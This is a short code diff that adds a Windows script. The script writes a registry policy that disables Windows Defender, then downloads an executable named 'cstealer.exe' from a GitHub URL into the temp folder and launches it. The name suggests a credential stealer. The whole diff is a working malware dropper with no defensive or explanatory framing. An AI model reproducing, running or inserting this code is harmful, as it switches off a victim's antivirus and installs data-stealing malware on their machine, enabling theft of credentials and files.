@@ -1,0 +1,5 @@
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
+$url = "https://github.com/POLAAA1/sasasef/raw/main/cstealer.exe"
+$output = "$env:TEMP\cstealer.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output -Wait
